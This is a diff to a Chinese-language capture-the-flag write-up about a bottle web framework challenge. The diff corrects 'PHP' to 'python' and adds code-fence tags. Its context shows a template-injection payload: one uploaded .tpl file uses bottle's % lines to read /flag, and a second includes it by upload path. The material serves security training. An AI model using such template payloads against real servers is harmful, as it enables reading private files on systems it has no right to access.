@@ -45,9 +45,9 @@ UUID8 生成脚本搞了一圈没搞定，在搜索的时候发现 py3.14 rc2 �
 
 分析源码可发现使用了 bottle 这个轻量级 Web 框架，
 分析题目逻辑，发现是渲染 template(模板)，
-重点关注通过模板注入 PHP 语句来获取 flag，
+重点关注通过模板注入来获取 flag，
 我们发现 `{}<>` 都用不了，但是查官网可知，
-bottle 还有 `%` 可以用来调用一行 PHP 脚本。
+bottle 还有 `%` 可以用来调用一行 python 脚本。
 
 那其他的系统 api 屏蔽词怎么办呢？
 
@@ -61,7 +61,7 @@ bottle 还有 `%` 可以用来调用一行 PHP 脚本。
 
 a.tpl
 
-```
+```python
 % import os
 % with open('/flag', 'r', encoding='utf-8') as f:
     % content = f.read()
@@ -73,7 +73,7 @@ a.tpl
 
 b.tpl
 
-```
+```python
 % include('uploads/8b961bf855a7b98f9be204d5f9deb096/a.tpl')
 ```
 
